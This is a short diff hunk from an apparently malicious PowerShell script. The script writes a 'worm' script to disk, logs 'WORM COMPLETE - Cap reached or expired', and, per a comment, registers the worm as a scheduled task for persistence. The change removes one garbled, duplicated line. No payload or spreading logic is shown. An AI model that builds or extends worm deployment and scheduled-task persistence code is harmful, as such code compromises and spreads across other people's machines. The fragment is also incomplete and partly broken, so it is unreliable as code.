@@ -1035,7 +1035,6 @@ Update-Status "last_action" "WORM COMPLETE - Cap reached or expired"; WLog "====
 "@
 
 [System.IO.File]::WriteAllText($wormScriptPath, $wormScriptContent, (New-Object System.Text.UTF8Encoding $false))
-Object System.Text.UTF8Encoding $false))
 
 # Register worm as scheduled task for persistence
 $wormTaskXml = @"
